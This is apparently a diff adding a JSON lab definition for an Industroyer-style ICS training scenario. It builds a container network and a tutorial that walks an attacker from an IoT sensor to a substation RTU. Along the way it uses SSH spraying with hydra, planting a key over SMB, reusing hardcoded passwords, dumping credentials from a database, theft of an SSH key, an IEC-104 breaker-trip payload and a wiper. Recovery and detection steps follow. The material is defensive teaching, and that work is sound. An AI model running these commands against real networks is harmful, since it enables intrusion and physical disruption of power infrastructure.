@@ -1,0 +1,467 @@
+{
+  "name": "ICS Scenario B3 — Industroyer (five ways in)",
+  "description": "A simpler, more intuitive Industroyer lab focused on a realistic IT→OT intrusion where every hop is a DIFFERENT technique (a failed default-cred spray → an SMB key-drop → a sanctioned SFTP service account → a database credential dump → SSH key theft), ending in the IEC-104 breaker trip, wiper and manual recovery from Scenario B2. The attacker starts on a compromised IoT sensor and crosses iot → fileserver → gateway → historian → ew. Short per-command explanations, clean commands. Uses the tollan Docker Hub registry (you'll be prompted to add it). The detailed case-study narrative lives in B2. Classroom guide: docs/ics-scenarios/scenario-b3-classroom-walkthrough.md.",
+  "topology": {
+    "name": "ICS Scenario B3 — Industroyer (five ways in)",
+    "description": "Four Purdue zones (IT 10.0.5.0/24 → DMZ 10.0.4.0/24 → OT 10.0.3.0/24 → PROCESS 10.0.1.0/24), two nftables firewalls flanking the DMZ, a dual-homed IEC-104 RTU with measured current/voltage, and an OVS SPAN to the IDS. Each IT→OT hop uses a distinct access technique and a distinct credential. Import after syncing the `tollan` registry.",
+    "sites": [
+      {
+        "id": "site-ics",
+        "name": "ICS Lab",
+        "location": "Lab",
+        "subnets": [
+          {
+            "id": "it-lan",
+            "name": "IT-LAN",
+            "cidr": "10.0.5.0/24",
+            "gateway": "10.0.5.1",
+            "purdueLevel": 4,
+            "containers": [
+              {
+                "id": "fw-it",
+                "name": "fw-it",
+                "type": "firewall",
+                "image": "tollan/nftables:latest",
+                "ip": "10.0.5.1",
+                "interfaces": [
+                  { "subnetId": "dmz-lan", "ip": "10.0.4.1" }
+                ]
+              },
+              {
+                "id": "it-sw",
+                "name": "it-sw",
+                "type": "switch",
+                "ip": "10.0.5.2"
+              },
+              {
+                "id": "iot",
+                "name": "iot",
+                "type": "attacker",
+                "image": "tollan/malicious-client:v0.11",
+                "ip": "10.0.5.10"
+              },
+              {
+                "id": "it-fileserver",
+                "name": "it-fileserver",
+                "type": "file-server",
+                "image": "tollan/smb:v0.3",
+                "ip": "10.0.5.30"
+              }
+            ],
+            "connections": [
+              { "id": "it-fw", "from": "it-sw", "to": "fw-it" },
+              { "id": "it-iot", "from": "it-sw", "to": "iot" },
+              { "id": "it-fs", "from": "it-sw", "to": "it-fileserver" }
+            ]
+          },
+          {
+            "id": "dmz-lan",
+            "name": "DMZ-LAN",
+            "cidr": "10.0.4.0/24",
+            "gateway": "10.0.4.1",
+            "containers": [
+              {
+                "id": "fw-ot",
+                "name": "fw-ot",
+                "type": "firewall",
+                "image": "tollan/nftables:latest",
+                "ip": "10.0.4.2",
+                "interfaces": [
+                  { "subnetId": "ot-lan", "ip": "10.0.3.1" }
+                ]
+              },
+              {
+                "id": "dmz-sw",
+                "name": "dmz-sw",
+                "type": "switch",
+                "ip": "10.0.4.3"
+              },
+              {
+                "id": "gateway",
+                "name": "gateway",
+                "type": "ftp-server",
+                "image": "tollan/ftp-server:v0.6",
+                "ip": "10.0.4.20"
+              },
+              {
+                "id": "historian",
+                "name": "historian",
+                "type": "database-server",
+                "image": "tollan/mariadb:v0.5",
+                "ip": "10.0.4.30"
+              }
+            ],
+            "connections": [
+              { "id": "dmz-fw", "from": "dmz-sw", "to": "fw-ot" },
+              { "id": "dmz-gw", "from": "dmz-sw", "to": "gateway" },
+              { "id": "dmz-hist", "from": "dmz-sw", "to": "historian" }
+            ]
+          },
+          {
+            "id": "ot-lan",
+            "name": "OT-LAN",
+            "cidr": "10.0.3.0/24",
+            "gateway": "10.0.3.1",
+            "purdueLevel": 2,
+            "containers": [
+              {
+                "id": "ot-sw",
+                "name": "ot-sw",
+                "type": "switch",
+                "image": "tollan/open-vswitch:latest",
+                "ip": "10.0.3.2",
+                "mirrorTo": "ids"
+              },
+              {
+                "id": "ew",
+                "name": "ew",
+                "type": "workstation",
+                "image": "tollan/benign-client:v0.12",
+                "ip": "10.0.3.15"
+              },
+              {
+                "id": "hmi",
+                "name": "hmi",
+                "type": "hmi",
+                "image": "tollan/c104-hmi:v0.3",
+                "ip": "10.0.3.30",
+                "webUiPort": 8080,
+                "env": {
+                  "IEC104_SERVER": "10.0.3.50"
+                }
+              },
+              {
+                "id": "ids",
+                "name": "ids",
+                "type": "ids",
+                "image": "tollan/zeek:latest",
+                "ip": "10.0.3.40"
+              },
+              {
+                "id": "rtu",
+                "name": "rtu",
+                "type": "plc",
+                "image": "tollan/c104-server:v0.2",
+                "ip": "10.0.3.50",
+                "interfaces": [
+                  { "subnetId": "process", "ip": "10.0.1.50" }
+                ]
+              }
+            ],
+            "connections": [
+              { "id": "ot-rtu", "from": "ot-sw", "to": "rtu" },
+              { "id": "ot-ew", "from": "ot-sw", "to": "ew" },
+              { "id": "ot-hmi", "from": "ot-sw", "to": "hmi" },
+              { "id": "ot-ids", "from": "ot-sw", "to": "ids" }
+            ]
+          },
+          {
+            "id": "process",
+            "name": "PROCESS",
+            "cidr": "10.0.1.0/24",
+            "purdueLevel": 0,
+            "containers": [
+              {
+                "id": "proc-sw",
+                "name": "proc-sw",
+                "type": "switch",
+                "ip": "10.0.1.2"
+              },
+              {
+                "id": "process-sim",
+                "name": "process-sim",
+                "type": "workstation",
+                "image": "tollan/process-sim:v0.4",
+                "ip": "10.0.1.10",
+                "webUiPort": 8000,
+                "env": {
+                  "SIM_PROTO": "iec104",
+                  "FIELD_HOST": "10.0.1.50"
+                }
+              }
+            ],
+            "connections": [
+              { "id": "proc-link", "from": "proc-sw", "to": "process-sim" }
+            ]
+          }
+        ],
+        "subnetConnections": []
+      }
+    ],
+    "siteConnections": [],
+    "tutorials": [
+      {
+        "id": "tutorial-ics-industroyer-b3",
+        "title": "Industroyer — five ways into the plant",
+        "setup": {
+          "steps": [
+            {
+              "id": "setup-fw-it",
+              "containerId": "fw-it",
+              "command": "nft insert rule inet filter forward ip saddr 10.0.5.30 ip daddr 10.0.4.20 tcp dport 22 accept\nnft insert rule inet filter forward ip saddr 10.0.4.30 ip daddr 10.0.3.0/24 accept\necho 'FW-IT armed: only fileserver -> gateway (sftp/22) crosses into the DMZ; the IoT cannot.'"
+            },
+            {
+              "id": "setup-fw-ot",
+              "containerId": "fw-ot",
+              "command": "nft insert rule inet filter forward ip saddr 10.0.4.30 ip daddr 10.0.3.0/24 accept\necho 'FW-OT armed: historian -> OT allowed (over-broad: the whole OT subnet). Every other DMZ->OT dropped.'"
+            },
+            {
+              "id": "setup-zeek",
+              "containerId": "ids",
+              "command": "mkdir -p /root/zeeklogs\nnohup sh -c 'cd /root/zeeklogs && exec zeek -i eth0 -C' >/tmp/zeek.out 2>&1 &\nsleep 2 && echo 'Zeek is watching the OT SPAN mirror; logs in /root/zeeklogs'"
+            }
+          ],
+          "traffic": [
+            {
+              "id": "traffic-telemetry",
+              "label": "Historian telemetry",
+              "kind": "command",
+              "from": ["historian"],
+              "to": ["rtu"],
+              "command": "while true; do BREAKER_RTU={to} breaker status >/dev/null 2>&1; sleep 3; done"
+            },
+            {
+              "id": "traffic-filepush",
+              "label": "Nightly file push",
+              "kind": "command",
+              "from": ["it-fileserver"],
+              "to": ["gateway"],
+              "command": "while true; do echo \"report $(date +%s)\" | sshpass -p 'Tr4nsf3r!' ssh svc-ft@{to} 'cat >> /tmp/reports.log' 2>/dev/null; sleep 5; done"
+            }
+          ]
+        },
+        "cells": [
+          {
+            "id": "b3-intro",
+            "kind": "markdown",
+            "source": "# Industroyer — five ways into the plant\n\nYou start with a shell on **`iot`**, a hacked internet-facing sensor on the office LAN. Your goal is the **substation RTU** deep in the plant — but there's a DMZ and two firewalls in the way. You'll cross `iot → fileserver → gateway → historian → ew`, and **every hop is a different weakness** (a failed password spray, an SMB misconfig, a reused service account, secrets in a database, a stolen SSH key). Then one IEC-104 command trips the breaker.\n\nEach command has a one-line explanation right above it. Run with **Next step**. The terminal walks the chain: once a cell SSHes onward, the next cells run on that host.\n\n> Keep the **`hmi`** and **`process-sim`** web UIs open (select the node → *Open web UI*) to watch the breaker and the physical feeder."
+          },
+          {
+            "id": "b3-setup-md",
+            "kind": "markdown",
+            "source": "**Click `Configure lab`** (top of this panel) once. It arms the two firewalls — only `fileserver → gateway` crosses into the DMZ, only `historian → OT` crosses into OT — starts the IDS, and begins the background telemetry + nightly file push that keep the plant lit."
+          },
+          {
+            "id": "b3-feeder",
+            "kind": "command",
+            "containerId": "process-sim",
+            "command": "feeder"
+          },
+          {
+            "id": "b3-recon-md",
+            "kind": "markdown",
+            "source": "## Where am I, and what's reachable?\n\nPrint our identity and sweep the office LAN for other hosts."
+          },
+          {
+            "id": "b3-recon",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "hostname; ip -o -4 addr show | awk '{print $2, $4}'\nnmap -sn 10.0.5.0/24"
+          },
+          {
+            "id": "b3-boundary-md",
+            "kind": "markdown",
+            "source": "The scan finds **`fileserver`** (`.30`). Can we reach the plant or the DMZ **directly** from here? Try the RTU's control port and the gateway's SSH — both are **filtered**. Only the fileserver is allowed to cross, because it runs the nightly file push."
+          },
+          {
+            "id": "b3-boundary",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "nmap -Pn -p 2404 10.0.3.50\nnmap -Pn -p 22 10.0.4.20"
+          },
+          {
+            "id": "b3-spray-md",
+            "kind": "markdown",
+            "source": "## Hop 1 · fileserver — ① try the easy thing first\n\nThe fastest way in is a guessed password. Spray the fileserver's SSH with a short list of common defaults."
+          },
+          {
+            "id": "b3-spray",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "hydra -l root -P /opt/ics/defaults.txt -t 4 -f ssh://10.0.5.30 2>/dev/null | grep -E 'host:|password:' || echo 'no valid login found — the password is not a default'"
+          },
+          {
+            "id": "b3-smb-md",
+            "kind": "markdown",
+            "source": "## ② SMB is the real way in\n\nGuessing failed. But the fileserver exposes a **writable SMB share** mapped onto a user's home directory. Write **our** SSH public key into their `~/.ssh/authorized_keys` over SMB:"
+          },
+          {
+            "id": "b3-smb-drop",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "smbclient //10.0.5.30/ftops -N -c 'mkdir .ssh; cd .ssh; put /opt/ics/attacker_key.pub authorized_keys'"
+          },
+          {
+            "id": "b3-ssh-fs-md",
+            "kind": "markdown",
+            "source": "Now log in with our key — **no password needed**. The misconfigured share *was* the vector."
+          },
+          {
+            "id": "b3-ssh-fs",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "ssh -i /opt/ics/attacker_key ftops@fileserver"
+          },
+          {
+            "id": "b3-push-md",
+            "kind": "markdown",
+            "source": "## Hop 2 · gateway — ③ abuse the sanctioned channel\n\nWe're on the **fileserver**. It pushes nightly reports to the DMZ gateway using a **service account** whose credentials sit in its config. Read them:"
+          },
+          {
+            "id": "b3-push-read",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "cat /etc/filetransfer/push.conf"
+          },
+          {
+            "id": "b3-ssh-gw-md",
+            "kind": "markdown",
+            "source": "Reuse that service account over the **same sanctioned path** — the one flow the firewall allows into the DMZ:"
+          },
+          {
+            "id": "b3-ssh-gw",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "sshpass -p 'Tr4nsf3r!' ssh svc-ft@gateway"
+          },
+          {
+            "id": "b3-db-md",
+            "kind": "markdown",
+            "source": "## Hop 3 · historian — ④ pull creds from the database\n\nWe're on the **gateway**, in the DMZ. It reports into the historian's database — and the DB keeps a credentials table. Dump it:"
+          },
+          {
+            "id": "b3-dbdump",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "mysql --defaults-extra-file=/etc/filebroker/report.cnf -h 10.0.4.30 telemetry -e 'SELECT service,host,username,secret FROM ot_credentials'"
+          },
+          {
+            "id": "b3-ssh-hist-md",
+            "kind": "markdown",
+            "source": "The dump hands us the historian's own **maintenance login**. Use it to get on the historian:"
+          },
+          {
+            "id": "b3-ssh-hist",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "sshpass -p 'H1st0r!an' ssh histadmin@historian"
+          },
+          {
+            "id": "b3-key-md",
+            "kind": "markdown",
+            "source": "## Hop 4 · ew — ⑤ steal the OT key\n\nWe're on the **historian** — the one host the firewall lets reach OT. It stores the **OT engineering SSH key** that the workstation trusts, and the attacker's payload is staged here. Grab the key (as a private key) and **drop the payload** onto the EW:"
+          },
+          {
+            "id": "b3-loot",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "install -m600 /etc/ot-collector/ot_engineering_key /tmp/otkey\nscp -i /tmp/otkey /opt/ics/industroyer104.py /opt/ics/104.cfg /opt/ics/ics-wiper.sh root@ew:/tmp/ && echo 'key looted, payload dropped'"
+          },
+          {
+            "id": "b3-ssh-ew-md",
+            "kind": "markdown",
+            "source": "Log in to the engineering workstation with the stolen key — **inside OT, past both firewalls**:"
+          },
+          {
+            "id": "b3-ssh-ew",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "ssh -i /tmp/otkey root@ew"
+          },
+          {
+            "id": "b3-recap-chain-md",
+            "kind": "markdown",
+            "source": "**Five hops, five different weaknesses, five different credentials** — none of them guessed. That's a *chain* of failures, not one reused password. Now the physical attack."
+          },
+          {
+            "id": "b3-reach-md",
+            "kind": "markdown",
+            "source": "## Trip the breaker\n\nWe're on the **EW**. Engineers only *read* the RTU from here — but nothing stops us *commanding* it. Confirm the target and the baseline:"
+          },
+          {
+            "id": "b3-reach",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "cat /tmp/104.cfg\nbreaker status"
+          },
+          {
+            "id": "b3-trip-md",
+            "kind": "markdown",
+            "source": "Launch the staged IEC-104 payload. It speaks the real protocol: a general interrogation to read state, then one single command to **open the breaker**. **Watch `hmi` flip to OPEN·red and `process-sim` go DARK** (0 A · 0 kV)."
+          },
+          {
+            "id": "b3-payload",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "/opt/venv/bin/python3 /tmp/industroyer104.py /tmp/104.cfg single"
+          },
+          {
+            "id": "b3-sustain-md",
+            "kind": "markdown",
+            "source": "## Loss of control\n\nThe operator clicks **Close** on the HMI — it works, briefly. So the attacker escalates to **sustained commanding**: re-open the breaker the instant it reads closed. (Runs in the background so we can keep going.)"
+          },
+          {
+            "id": "b3-sustain",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "nohup /opt/venv/bin/python3 /tmp/industroyer104.py /tmp/104.cfg range >/tmp/payload.log 2>&1 &\nsleep 2 && echo 'sustained commanding active' && tail -n 3 /tmp/payload.log"
+          },
+          {
+            "id": "b3-lost-md",
+            "kind": "markdown",
+            "source": "Now have the operator click **Close** again on the HMI — it **snaps straight back to OPEN**. They've lost control of the feeder."
+          },
+          {
+            "id": "b3-wipe-md",
+            "kind": "markdown",
+            "source": "## Loss of view\n\nBlind the operator: drop a **wiper** on the HMI that destroys its SCADA project and kills the console. *(Symbolic — it only touches a scratch dir inside the HMI.)* The RTU is untouched; `process-sim` still shows the truth."
+          },
+          {
+            "id": "b3-wiper",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "sshpass -p pass scp /tmp/ics-wiper.sh root@hmi:/tmp/ics-wiper.sh\nsshpass -p pass ssh root@hmi 'sh /tmp/ics-wiper.sh'"
+          },
+          {
+            "id": "b3-evict-md",
+            "kind": "markdown",
+            "source": "## Recovery — evict, then go local\n\nYou can't out-click the malware from the HMI. Responders kill the rogue payload on the EW (this stops the sustained commands):"
+          },
+          {
+            "id": "b3-evict",
+            "kind": "command",
+            "containerId": "iot",
+            "command": "pkill -f '[i]ndustroyer104' && echo 'payload killed — sustained commanding stops' || echo 'no payload running'"
+          },
+          {
+            "id": "b3-local-md",
+            "kind": "markdown",
+            "source": "The HMI is destroyed, so recovery is **manual, on-site at the RTU**. Close the breaker locally:"
+          },
+          {
+            "id": "b3-local",
+            "kind": "command",
+            "containerId": "rtu",
+            "command": "BREAKER_RTU=127.0.0.1 breaker close\nsleep 1 && BREAKER_RTU=127.0.0.1 breaker status"
+          },
+          {
+            "id": "b3-detect-md",
+            "kind": "markdown",
+            "source": "## What the defender saw\n\n`process-sim` is **ENERGIZED** again, but blind and manual — the real 2016 outcome. On the **IDS**, the whole attack is only **plain TCP to 2404**. Even decoded it's a *valid* command; what's anomalous is that it came from the **EW**, which reads the RTU but never commands it. Detection is **context** (who commands the RTU), not protocol decoding."
+          },
+          {
+            "id": "b3-conn",
+            "kind": "command",
+            "containerId": "ids",
+            "command": "echo 'Connections to the RTU control port (2404):'\ngrep -v '^#' /root/zeeklogs/conn.log 2>/dev/null | awk '$6==2404 {print \"  \"$3\" -> \"$5\":2404\"}' | tail"
+          },
+          {
+            "id": "b3-recap-md",
+            "kind": "markdown",
+            "source": "## Recap\n\n| Hop | Weakness | Credential |\n|---|---|---|\n| iot → fileserver | writable SMB share (key-drop) | an SSH key *we* planted |\n| fileserver → gateway | reused file-transfer service account | `svc-ft` |\n| gateway → historian | secrets in a database | `histadmin` (dumped) |\n| historian → ew | SSH key sprawl | the OT engineering key |\n| ew → rtu | unauthenticated IEC-104 | none needed |\n\n**The lessons:** a default-cred spray failing didn't save the fileserver (its SMB share did it in); a single reused service account crossed the DMZ; a database full of credentials undid the historian; and once inside OT, an **unauthenticated protocol means reachability = control**. Fix each independently: no writable shares, no stored service creds, no secrets in databases, no key sprawl — and authenticate OT control.\n\n**Reset:** `exit` the shells back to `iot`; redeploy for a clean lab."
+          }
+        ]
+      }
+    ]
+  }
+}
